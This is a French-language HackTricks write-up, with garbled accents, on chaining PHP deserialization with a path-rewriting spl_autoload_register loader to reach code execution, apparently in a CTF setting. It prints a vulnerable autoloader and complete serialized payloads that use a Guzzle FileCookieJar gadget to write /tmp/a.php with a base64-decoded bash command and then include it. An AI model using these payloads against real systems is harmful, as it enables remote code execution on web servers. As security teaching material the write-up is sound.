# PHP - D√©s√©rialisation + Chargement Automatique de Classes

{% hint style="success" %}
Apprenez et pratiquez le Hacking AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Formation AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Apprenez et pratiquez le Hacking GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Formation GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenir HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-nous sur** **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de hacking en soumettant des PRs aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts github.

</details>
{% endhint %}

Tout d'abord, vous devriez v√©rifier ce que sont les [**Classes de Chargement Automatique**](https://www.php.net/manual/en/language.oop5.autoload.php).

## D√©s√©rialisation PHP + spl\_autoload\_register + LFI/Gadget

Nous sommes dans une situation o√π nous avons trouv√© une **d√©s√©rialisation PHP dans une webapp** sans **aucune** biblioth√®que vuln√©rable aux gadgets √† l'int√©rieur de **`phpggc`**. Cependant, dans le m√™me conteneur, il y avait une **autre webapp composer avec des biblioth√®ques vuln√©rables**. Par cons√©quent, l'objectif √©tait de **charger le chargeur composer de l'autre webapp** et de l'exploiter pour **charger un gadget qui exploitera cette biblioth√®que avec un gadget** de la webapp vuln√©rable √† la d√©s√©rialisation.

√âtapes :

* Vous avez trouv√© une **d√©s√©rialisation** et il **n'y a pas de gadget** dans le code de l'application actuelle
* Vous pouvez abuser d'une fonction **`spl_autoload_register`** comme suit pour **charger n'importe quel fichier local avec l'extension `.php`**
* Pour cela, vous utilisez une d√©s√©rialisation o√π le nom de la classe sera √† l'int√©rieur de **`$name`**. Vous **ne pouvez pas utiliser "/" ou "."** dans un nom de classe dans un objet s√©rialis√©, mais le **code** est **en train de remplacer** les **traits d'union** ("\_") **par des barres obliques** ("/"). Ainsi, un nom de classe tel que `tmp_passwd` sera transform√© en `/tmp/passwd.php` et le code essaiera de le charger.\
Un **exemple de gadget** sera : **`O:10:"tmp_passwd":0:{}`**
```php
spl_autoload_register(function ($name) {

if (preg_match('/Controller$/', $name)) {
$name = "controllers/${name}";
} elseif (preg_match('/Model$/', $name)) {
$name = "models/${name}";
} elseif (preg_match('/_/', $name)) {
$name = preg_replace('/_/', '/', $name);
}

$filename = "/${name}.php";

if (file_exists($filename)) {
require $filename;
}
elseif (file_exists(__DIR__ . $filename)) {
require __DIR__ . $filename;
}
});
```
{% hint style="success" %}
Si vous avez un **t√©l√©chargement de fichier** et que vous pouvez t√©l√©charger un fichier avec une **extension `.php`**, vous pourriez **abuser de cette fonctionnalit√© directement** et obtenir d√©j√† un RCE.
{% endhint %}

Dans mon cas, je n'avais rien de tel, mais il y avait √† l'int√©rieur du **m√™me conteneur** une autre page web composer avec une **biblioth√®que vuln√©rable √† un gadget `phpggc`**.

* Pour charger cette autre biblioth√®que, vous devez d'abord **charger le chargeur composer de cette autre application web** (car celui de l'application actuelle n'acc√©dera pas aux biblioth√®ques de l'autre). **Connaissant le chemin de l'application**, vous pouvez y parvenir tr√®s facilement avec : **`O:28:"www_frontend_vendor_autoload":0:{}`** (Dans mon cas, le chargeur composer √©tait dans `/www/frontend/vendor/autoload.php`)
* Maintenant, vous pouvez **charger** le **chargeur composer de l'autre application**, donc il est temps de **`g√©n√©rer le phpgcc`** **payload** √† utiliser. Dans mon cas, j'ai utilis√© **`Guzzle/FW1`**, ce qui m'a permis de **√©crire n'importe quel fichier dans le syst√®me de fichiers**.
* REMARQUE : Le **gadget g√©n√©r√© ne fonctionnait pas**, pour qu'il fonctionne, j'ai **modifi√©** ce payload **`chain.php`** de phpggc et d√©fini **tous les attributs** des classes **de priv√© √† public**. Sinon, apr√®s avoir d√©s√©rialis√© la cha√Æne, les attributs des objets cr√©√©s n'avaient aucune valeur.
* Maintenant, nous avons le moyen de **charger le chargeur composer de l'autre application** et d'avoir un **payload phpggc qui fonctionne**, mais nous devons **faire cela dans la M√äME DEMANDE pour que le chargeur soit charg√© lorsque le gadget est utilis√©**. Pour cela, j'ai envoy√© un tableau s√©rialis√© avec les deux objets comme :
* Vous pouvez voir **d'abord le chargeur √™tre charg√© puis le payload**

{% code overflow="wrap" %}
```php
a:2:{s:5:"Extra";O:28:"www_frontend_vendor_autoload":0:{}s:6:"Extra2";O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:7:"cookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:4:"data";a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:56:"<?php system('echo L3JlYWRmbGFn | base64 -d | bash'); ?>";}}}s:10:"strictMode";N;s:8:"filename";s:10:"/tmp/a.php";s:19:"storeSessionCookies";b:1;}}
```
{% endcode %}

* Maintenant, nous pouvons **cr√©er et √©crire un fichier**, cependant, l'utilisateur **ne pouvait pas √©crire dans n'importe quel dossier √† l'int√©rieur du serveur web**. Donc, comme vous pouvez le voir dans le payload, PHP appelle **`system`** avec un **base64** qui est cr√©√© dans **`/tmp/a.php`**. Ensuite, nous pouvons **r√©utiliser le premier type de payload** que nous avons utilis√© comme LFI pour charger le chargeur de composer de l'autre webapp **pour charger le fichier g√©n√©r√© `/tmp/a.php`**. Il suffit de l'ajouter au gadget de d√©s√©rialisation :&#x20;

{% code overflow="wrap" %}
```php
a:3:{s:5:"Extra";O:28:"www_frontend_vendor_autoload":0:{}s:6:"Extra2";O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:7:"cookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:4:"data";a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:56:"<?php system('echo L3JlYWRmbGFn | base64 -d | bash'); ?>";}}}s:10:"strictMode";N;s:8:"filename";s:10:"/tmp/a.php";s:19:"storeSessionCookies";b:1;}s:6:"Extra3";O:5:"tmp_a":0:{}}
```
{% endcode %}

**R√©sum√© de la charge utile**

* **Charger l'autoload de composer** d'une autre webapp dans le m√™me conteneur
* **Charger un gadget phpggc** pour abuser d'une biblioth√®que de l'autre webapp (la webapp initiale vuln√©rable √† la d√©s√©rialisation n'avait pas de gadget dans ses biblioth√®ques)
* Le gadget va **cr√©er un fichier avec une charge utile PHP** dessus dans /tmp/a.php avec des commandes malveillantes (l'utilisateur de la webapp ne peut pas √©crire dans aucun dossier de aucune webapp)
* La derni√®re partie de notre charge utile va **charger le fichier PHP g√©n√©r√©** qui ex√©cutera des commandes

J'ai d√ª **appeler cette d√©s√©rialisation deux fois**. Dans mes tests, la premi√®re fois le fichier `/tmp/a.php` a √©t√© cr√©√© mais pas charg√©, et la deuxi√®me fois il a √©t√© correctement charg√©.

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
